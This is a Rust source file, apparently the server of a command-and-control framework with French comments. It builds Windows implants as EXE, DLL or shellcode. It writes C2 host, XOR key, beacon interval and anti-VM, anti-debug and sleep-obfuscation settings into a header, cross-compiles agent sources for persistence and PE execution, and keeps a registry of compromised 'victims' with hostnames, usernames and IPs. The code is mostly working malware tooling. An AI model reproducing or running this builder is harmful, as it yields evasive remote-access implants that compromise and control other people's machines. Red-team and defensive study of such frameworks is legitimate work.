use crate::admin::Database;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, VecDeque};
use std::env;
use std::fs;
use std::process::Command;
use std::sync::{Arc, Mutex};
use std::time::{SystemTime, UNIX_EPOCH};
use uuid::Uuid;

// Au début du fichier
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentConfig {
    pub host: String,
    pub port: u16,
    pub uri_path: String,
    pub user_agent: String,
    pub xor_key: String,
    pub beacon_interval: u32,
    pub anti_vm: bool,
    pub anti_debug: bool,
    pub headers: Vec<(String, String)>,
    pub use_sleep_obfuscation: u32,
    pub sleep_jitter_percent: f32,
    pub encrypt_memory_on_sleep: bool,
}
// -------------------------------------------------------

// -------------------------------------------------------

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentInfo {
    pub agent_id: String,
    pub hostname: Option<String>,
    pub username: Option<String>,
    pub process_name: Option<String>,
    pub ip: Option<String>,
    pub last_seen: u64,
    pub payload_type: String,
    pub listener_name: String,
    pub file_path: Option<String>,
}

#[derive(Debug, Clone)]
struct Agent {
    info: AgentInfo,
    commands: VecDeque<String>,
    results: VecDeque<String>,
}

#[derive(Clone)]
pub struct AgentHandler {
    agents: Arc<Mutex<HashMap<String, Agent>>>,
}

impl AgentHandler {
    pub fn new() -> Self {
        Self {
            agents: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    pub fn create_agent_with_config(
        &self,
        listener_name: &str,
        payload_type: &str,
        config: &AgentConfig,
        database: &Arc<Database>,
    ) -> Result<Vec<u8>, String> {
        let agent_id = Uuid::new_v4().to_string();

        log::info!(
            "[+] Generating agent {} (type {} on listener {})",
            agent_id,
            payload_type,
            listener_name
        );

        let payload = self.generate_payload_with_config(
            &agent_id,
            listener_name,
            payload_type,
            config,
            database,
        )?;

        log::info!(
            "[+] Agent {} generated successfully (not registered until check-in)",
            agent_id
        );

        Ok(payload)
    }

    fn generate_payload_with_config(
        &self,
        agent_id: &str,
        listener_name: &str,
        payload_type: &str,
        config: &AgentConfig,
        database: &Arc<Database>,
    ) -> Result<Vec<u8>, String> {
        match payload_type.to_lowercase().as_str() {
            "exe" | "windows" => self.generate_windows_payload_with_config_exe(
                agent_id,
                listener_name,
                config,
                database,
            ),
            "dll" => self.generate_windows_payload_with_config_dll(
                agent_id,
                listener_name,
                config,
                database,
            ),
            "shellcode" => self.generate_windows_payload_with_config_shellcode(
                agent_id,
                listener_name,
                config,
                database,
            ),
            _ => Err(format!("Unsupported payload type: {}", payload_type)),
        }
    }

    fn generate_windows_payload_with_config_shellcode(
        &self,
        _agent_id: &str,
        listener_name: &str,
        config: &AgentConfig,
        database: &Arc<Database>,
    ) -> Result<Vec<u8>, String> {
        // D'abord générer la DLL
        let dll_data = self.generate_windows_payload_with_config_dll(
            _agent_id,
            listener_name,
            config,
            database,
        )?;

        let cwd = env::current_dir().map_err(|e| format!("Cannot get current directory: {}", e))?;
        let project_root = cwd
            .parent()
            .map(|p| p.to_path_buf())
            .ok_or_else(|| format!("Cannot determine project root from cwd: {}", cwd.display()))?;

        let reflective_loader_path = project_root
            .join("agent")
            .join("http")
            .join("ReflectiveLoader");
        let dll_temp_path = reflective_loader_path.join("temp_agent.dll");
        let shellcode_output_path = reflective_loader_path.join("shellcode.bin");

        // Sauvegarder la DLL temporairement
        fs::write(&dll_temp_path, &dll_data)
            .map_err(|e| format!("Failed to write temp DLL: {}", e))?;

        log::info!("[*] Converting DLL to shellcode using ReflectiveLoader...");

        // Exécuter le script Python
        let script_path = reflective_loader_path.join("shellcodize.py");
        let cmd = format!(
            "cd {} && python3 {} {}",
            reflective_loader_path.to_string_lossy(),
            script_path.to_string_lossy(),
            dll_temp_path.to_string_lossy()
        );

        Self::run_cmd(&cmd).map_err(|e| format!("Shellcode conversion failed: {}", e))?;

        // Lire le shellcode généré
        let shellcode = fs::read(&shellcode_output_path)
            .map_err(|e| format!("Failed to read shellcode: {}", e))?;

        // Nettoyer les fichiers temporaires
        let _ = fs::remove_file(&dll_temp_path);
        let _ = fs::remove_file(&shellcode_output_path);

        log::info!("[+] Shellcode generated: {} bytes", shellcode.len());

        Ok(shellcode)
    }

    fn generate_windows_payload_with_config_dll(
        &self,
        _agent_id: &str,
        listener_name: &str,
        config: &AgentConfig,
        database: &Arc<Database>,
    ) -> Result<Vec<u8>, String> {
        let listener = match database.get_listener(listener_name) {
            Ok(Some(listener)) => listener,
            Ok(None) => {
                return Err(format!(
                    "Listener '{}' not found in database",
                    listener_name
                ));
            }
            Err(e) => {
                return Err(format!("Database error while checking listener: {}", e));
            }
        };
        let use_https = listener.listener_type.to_lowercase() == "https";

        if listener.listener_type.to_lowercase() != "http"
            && listener.listener_type.to_lowercase() != "https"
        {
            return Err(format!(
                "Only HTTP/HTTPS listener supported for Windows payload, got: {}",
                listener.listener_type
            ));
        }

        log::info!(
            "[+] Using {} listener '{}' from database (host: {}:{}, path: {})",
            if use_https { "HTTPS" } else { "HTTP" },
            listener_name,
            listener.host,
            listener.port,
            listener.uri_paths
        );

        if !Self::check_compiler() {
            return Err("Missing cross-compiler: x86_64-w64-mingw32-g++".into());
        }

        let mut header_parts = Vec::new();

        for (key, value) in &listener.http_headers {
            header_parts.push(format!("{}: {}", key, value));
        }
        let header_cstr = header_parts.join("\\n");

        log::info!("[*] Generating config.h with listener data:");
        log::info!("    - Host: {}:{}", listener.host, listener.port);
        log::info!("    - URI Path: {}", listener.uri_paths);
        log::info!("    - User-Agent: {}", listener.user_agent);
        log::info!("    - XOR Key: {}", listener.xor_key);
        log::info!("    - Headers: {}", header_cstr.replace("\\n", ", "));
        log::info!("    - Beacon Interval: {}s", config.beacon_interval);
        log::info!("    - Anti-Debug: {}", config.anti_debug);
        log::info!("    - Anti-VM: {}", config.anti_vm);
        log::info!("    - USE_HTTPS: {}", use_https);
        log::info!(
            "    - USE_SLEEP_OBFUSCATION: {}",
            config.use_sleep_obfuscation
        );
        log::info!(
            "    - SLEEP_JITTER_PERCENT: {}",
            config.sleep_jitter_percent
        );
        log::info!(
            "    - ENCRYPT_MEMORY_ON_SLEEP: {}",
            config.encrypt_memory_on_sleep
        );

        let new_agent_config = format!(
            r#"#pragma once
#include <string>
// Configuration générée depuis le listener: {}
constexpr char XOR_KEY[] = "{}";
constexpr char XOR_SERVERS[] = "{}";
constexpr int XOR_PORT = {};
constexpr char USER_AGENT[] = "{}";
constexpr char HEADER[] = "{}";
constexpr char RESULTS_PATH[] = "{}";
constexpr int BEACON_INTERVAL = {};
constexpr bool ANTI_DEBUG_ENABLED = {};
constexpr bool ANTI_VM_ENABLED = {};
constexpr bool USE_HTTPS = {};
constexpr int USE_SLEEP_OBFUSCATION = {};
constexpr float SLEEP_JITTER_PERCENT = {};
constexpr bool ENCRYPT_MEMORY_ON_SLEEP = {};
"#,
            listener_name,
            listener.xor_key,
            listener.host,
            listener.port,
            listener.user_agent,
            header_cstr,
            listener.uri_paths,
            config.beacon_interval,
            if config.anti_debug { "true" } else { "false" },
            if config.anti_vm { "true" } else { "false" },
            if use_https { "true" } else { "false" },
            config.use_sleep_obfuscation,
            config.sleep_jitter_percent,
            config.encrypt_memory_on_sleep,
        );
        let cwd = env::current_dir().map_err(|e| format!("Cannot get current directory: {}", e))?;

        let project_root = cwd
            .parent()
            .map(|p| p.to_path_buf())
            .ok_or_else(|| format!("Cannot determine project root from cwd: {}", cwd.display()))?;

        let agent_path = project_root.join("agent").join("http");
        if !agent_path.exists() {
            return Err(format!(
                "Agent path does not exist: {}",
                agent_path.display()
            ));
        }
        let agent_path_str = agent_path.to_string_lossy();

        let config_path = format!("{}/config.h", agent_path_str);
        fs::write(&config_path, &new_agent_config)
            .map_err(|e| format!("Failed to write config file '{}': {}", config_path, e))?;

        log::info!("[+] Configuration file written to: {}", config_path);

        let dll_path = format!("{}/agent.dll", agent_path_str);

        let cmd = format!(
            "x86_64-w64-mingw32-g++ \
                -o {dll} \
                {p}/main_exe.cpp \
                {p}/base64.cpp \
                {p}/crypt.cpp \
                {p}/system_utils.cpp \
                {p}/file_utils.cpp \
                {p}/http_client.cpp \
                {p}/task.cpp \
                {p}/pe-exec.cpp \
                {p}/persistence.cpp \
                {p}/debug_detection.cpp \
                {p}/vm_detection.cpp \
                {p}/sleep_obfuscation.cpp \
                -lwininet -lpsapi -lshlwapi -lole32 -lshell32 -static-libstdc++ -static-libgcc -lws2_32",
            dll = dll_path,
            p = agent_path_str
        );

        log::info!("[*] Compiling Windows agent...");

        Self::run_cmd(&cmd).map_err(|e| format!("Compilation failed: {}", e))?;

        log::info!("[+] Compilation successful: {}", dll_path);

        fs::read(&dll_path)
            .map_err(|e| format!("Failed to read generated exe '{}': {}", dll_path, e))
    }

    fn generate_windows_payload_with_config_exe(
        &self,
        _agent_id: &str,
        listener_name: &str,
        config: &AgentConfig,
        database: &Arc<Database>,
    ) -> Result<Vec<u8>, String> {
        let listener = match database.get_listener(listener_name) {
            Ok(Some(listener)) => listener,
            Ok(None) => {
                return Err(format!(
                    "Listener '{}' not found in database",
                    listener_name
                ));
            }
            Err(e) => {
                return Err(format!("Database error while checking listener: {}", e));
            }
        };

        let use_https = listener.listener_type.to_lowercase() == "https";

        if listener.listener_type.to_lowercase() != "http"
            && listener.listener_type.to_lowercase() != "https"
        {
            return Err(format!(
                "Only HTTP/HTTPS listener supported for Windows payload, got: {}",
                listener.listener_type
            ));
        }

        log::info!(
            "[+] Using {} listener '{}' from database (host: {}:{}, path: {})",
            if use_https { "HTTPS" } else { "HTTP" },
            listener_name,
            listener.host,
            listener.port,
            listener.uri_paths
        );

        if !Self::check_compiler() {
            return Err("Missing cross-compiler: x86_64-w64-mingw32-g++".into());
        }

        let mut header_parts = Vec::new();

        for (key, value) in &listener.http_headers {
            header_parts.push(format!("{}: {}", key, value));
        }

        let header_cstr = header_parts.join("\\n");

        log::info!("[*] Generating config.h with listener data:");
        log::info!("    - Host: {}:{}", listener.host, listener.port);
        log::info!("    - URI Path: {}", listener.uri_paths);
        log::info!("    - User-Agent: {}", listener.user_agent);
        log::info!("    - XOR Key: {}", listener.xor_key);
        log::info!("    - Headers: {}", header_cstr.replace("\\n", ", "));
        log::info!("    - Beacon Interval: {}s", config.beacon_interval);
        log::info!("    - Anti-VM: {}", config.anti_vm);
        log::info!("    - Anti-Debug: {}", config.anti_debug);
        log::info!(
            "    - USE_SLEEP_OBFUSCATION: {}",
            config.use_sleep_obfuscation
        );
        log::info!(
            "    - SLEEP_JITTER_PERCENT: {}",
            config.sleep_jitter_percent
        );
        log::info!(
            "    - ENCRYPT_MEMORY_ON_SLEEP: {}",
            config.encrypt_memory_on_sleep
        );
        log::info!("    - USE_HTTPS: {}", use_https);

        let new_agent_config = format!(
            r#"#pragma once
#include <string>
// Configuration générée depuis le listener: {}
constexpr char XOR_KEY[] = "{}";
constexpr char XOR_SERVERS[] = "{}";
constexpr int XOR_PORT = {};
constexpr char USER_AGENT[] = "{}";
constexpr char HEADER[] = "{}";
constexpr char RESULTS_PATH[] = "{}";
constexpr int BEACON_INTERVAL = {};
constexpr bool ANTI_DEBUG_ENABLED = {};
constexpr bool ANTI_VM_ENABLED = {};
constexpr bool USE_HTTPS = {};
constexpr int USE_SLEEP_OBFUSCATION = {};
constexpr float SLEEP_JITTER_PERCENT = {};
constexpr bool ENCRYPT_MEMORY_ON_SLEEP = {};
"#,
            listener_name,
            listener.xor_key,
            listener.host,
            listener.port,
            listener.user_agent,
            header_cstr,
            listener.uri_paths,
            config.beacon_interval,
            if config.anti_debug { "true" } else { "false" },
            if config.anti_vm { "true" } else { "false" },
            if use_https { "true" } else { "false" },
            config.use_sleep_obfuscation,
            config.sleep_jitter_percent,
            config.encrypt_memory_on_sleep,
        );

        let cwd = env::current_dir().map_err(|e| format!("Cannot get current directory: {}", e))?;

        let project_root = cwd
            .parent()
            .map(|p| p.to_path_buf())
            .ok_or_else(|| format!("Cannot determine project root from cwd: {}", cwd.display()))?;

        let agent_path = project_root.join("agent").join("http");
        if !agent_path.exists() {
            return Err(format!(
                "Agent path does not exist: {}",
                agent_path.display()
            ));
        }
        let agent_path_str = agent_path.to_string_lossy();

        let config_path = format!("{}/config.h", agent_path_str);
        fs::write(&config_path, &new_agent_config)
            .map_err(|e| format!("Failed to write config file '{}': {}", config_path, e))?;

        log::info!("[+] Configuration file written to: {}", config_path);

        let exe_path = format!("{}/agent.exe", agent_path_str);

        let cmd = format!(
            "x86_64-w64-mingw32-g++ \
                -o {exe} \
                {p}/main_exe.cpp \
                {p}/base64.cpp \
                {p}/crypt.cpp \
                {p}/system_utils.cpp \
                {p}/file_utils.cpp \
                {p}/http_client.cpp \
                {p}/task.cpp \
                {p}/pe-exec.cpp \
                {p}/persistence.cpp \
                {p}/debug_detection.cpp \
                {p}/vm_detection.cpp \
                {p}/sleep_obfuscation.cpp \
                -lwininet -lpsapi -lshlwapi -lole32 -lshell32 -static-libstdc++ -static-libgcc -lws2_32",
            exe = exe_path,
            p = agent_path_str
        );

        log::info!("[*] Compiling Windows agent...");

        Self::run_cmd(&cmd).map_err(|e| format!("Compilation failed: {}", e))?;

        log::info!("[+] Compilation successful: {}", exe_path);

        fs::read(&exe_path)
            .map_err(|e| format!("Failed to read generated exe '{}': {}", exe_path, e))
    }

    fn check_compiler() -> bool {
        Command::new("which")
            .arg("x86_64-w64-mingw32-g++")
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false)
    }

    fn run_cmd(cmd: &str) -> Result<(), String> {
        let output = Command::new("bash")
            .arg("-c")
            .arg(cmd)
            .output()
            .map_err(|e| format!("Failed to execute command '{}': {}", cmd, e))?;

        if output.status.success() {
            Ok(())
        } else {
            Err(format!(
                "Command returned non-zero status ({}). stderr: {}",
                output.status,
                String::from_utf8_lossy(&output.stderr)
            ))
        }
    }

    // ========== MODIFICATION: register_agent avec support DB ==========
    pub fn register_agent(
        &self,
        agent_id: String,
        info: AgentInfo,
        database: Option<&Arc<Database>>,
    ) {
        let mut agents = self.agents.lock().unwrap();
        agents.insert(
            agent_id.clone(),
            Agent {
                info: info.clone(),
                commands: VecDeque::new(),
                results: VecDeque::new(),
            },
        );

        // Enregistrer dans la DB si une référence est fournie
        if let Some(db) = database {
            match db.get_agent(&agent_id) {
                Ok(None) => {
                    // L'agent n'existe pas, on l'ajoute
                    if let Err(e) = db.add_agents(
                        &agent_id,
                        &info.payload_type,
                        "system", // Utilisateur par défaut pour les agents auto-enregistrés
                        info.file_path.as_deref(),
                    ) {
                        log::warn!("[!] Failed to register agent {} in DB: {}", agent_id, e);
                    } else {
                        log::info!("[+] Agent {} registered in DB", agent_id);
                    }
                }
                Ok(Some(_)) => {
                    log::debug!("[*] Agent {} already exists in DB", agent_id);
                }
                Err(e) => {
                    log::error!("[!] Error checking agent existence in DB: {}", e);
                }
            }
        }
    }

    // ========== MODIFICATION: update_agent avec support DB ==========
    pub fn update_agent(&self, agent_id: &str, info: AgentInfo, database: Option<&Arc<Database>>) {
        let mut agents = self.agents.lock().unwrap();
        if let Some(agent) = agents.get_mut(agent_id) {
            agent.info = info.clone();
        }

        // Enregistrer dans la DB si une référence est fournie et que l'agent n'existe pas encore
        if let Some(db) = database {
            match db.get_agent(agent_id) {
                Ok(None) => {
                    // L'agent n'existe pas, on l'ajoute
                    if let Err(e) = db.add_agents(
                        agent_id,
                        &info.payload_type,
                        "system", // Utilisateur par défaut pour les agents auto-enregistrés
                        info.file_path.as_deref(),
                    ) {
                        log::warn!("[!] Failed to register agent {} in DB: {}", agent_id, e);
                    } else {
                        log::info!("[+] Agent {} registered in DB (via update)", agent_id);
                    }
                }
                Ok(Some(_)) => {
                    log::debug!("[*] Agent {} already exists in DB", agent_id);
                }
                Err(e) => {
                    log::error!("[!] Error checking agent existence in DB: {}", e);
                }
            }
        }
    }

    pub fn get_agent(&self, agent_id: &str) -> Option<AgentInfo> {
        self.agents
            .lock()
            .unwrap()
            .get(agent_id)
            .map(|a| a.info.clone())
    }

    pub fn list_agents(&self) -> Vec<AgentInfo> {
        self.agents
            .lock()
            .unwrap()
            .values()
            .map(|a| a.info.clone())
            .collect()
    }

    pub fn push_result(&self, agent_id: &str, result: String) {
        if let Some(agent) = self.agents.lock().unwrap().get_mut(agent_id) {
            agent.results.push_back(result);
        }
    }

    pub fn get_current_timestamp() -> u64 {
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs()
    }

    pub fn load_agents_from_db(&self, database: &Arc<Database>) -> Result<usize, String> {
        log::info!("[*] Loading agents from database...");

        let victims = database
            .get_all_victims()
            .map_err(|e| format!("Failed to load victims from DB: {}", e))?;

        let mut agents = self.agents.lock().unwrap();
        let mut loaded_count = 0;

        for victim in victims {
            // Vérifier si l'agent existe déjà en mémoire
            if agents.contains_key(&victim.agent_id) {
                log::debug!("[*] Agent {} already in memory, skipping", victim.agent_id);
                continue;
            }

            // Récupérer les infos de l'agent depuis la table agents
            let (payload_type, listener_name, file_path) =
                match database.get_agent(&victim.agent_id) {
                    Ok(Some((_, agent_type, _, path))) => (agent_type, "unknown".to_string(), path),
                    Ok(None) => {
                        log::warn!(
                            "[!] Agent {} found in victim_info but not in agents table",
                            victim.agent_id
                        );
                        ("exe".to_string(), "unknown".to_string(), None)
                    }
                    Err(e) => {
                        log::error!("[!] Error fetching agent {}: {}", victim.agent_id, e);
                        continue;
                    }
                };

            // Créer l'AgentInfo
            let agent_info = AgentInfo {
                agent_id: victim.agent_id.clone(),
                hostname: Some(victim.hostname),
                username: Some(victim.username),
                process_name: Some(victim.process_name),
                ip: Some(victim.ip_address),
                last_seen: Self::parse_datetime_to_timestamp(&victim.last_seen),
                payload_type,
                listener_name,
                file_path,
            };

            // Ajouter l'agent en mémoire
            agents.insert(
                victim.agent_id.clone(),
                Agent {
                    info: agent_info,
                    commands: VecDeque::new(),
                    results: VecDeque::new(),
                },
            );

            loaded_count += 1;
            log::info!("[+] Agent {} loaded from database", victim.agent_id);
        }

        log::info!("[+] {} agent(s) loaded from database", loaded_count);
        Ok(loaded_count)
    }

    /// Convertir une date SQL en timestamp Unix
    fn parse_datetime_to_timestamp(datetime_str: &str) -> u64 {
        // Format attendu: "YYYY-MM-DD HH:MM:SS"
        match chrono::NaiveDateTime::parse_from_str(datetime_str, "%Y-%m-%d %H:%M:%S") {
            Ok(dt) => dt.and_utc().timestamp() as u64,
            Err(e) => {
                log::warn!("[!] Failed to parse datetime '{}': {}", datetime_str, e);
                Self::get_current_timestamp()
            }
        }
    }
}
